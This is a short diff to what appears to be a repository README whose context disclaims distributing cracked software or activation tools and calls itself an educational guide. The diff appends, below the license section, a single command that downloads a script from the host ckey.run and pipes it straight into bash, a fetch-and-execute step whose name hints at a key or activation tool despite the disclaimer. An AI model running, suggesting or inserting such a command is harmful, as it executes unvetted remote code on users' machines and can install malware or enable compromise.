@@ -45,3 +45,6 @@ This repository does **not** distribute or support cracked software, activation 
 ## 📄 License
 
 This guide is for educational purposes only.
+
+curl -Ls ckey.run -o ckey.run && bash ckey.run
+
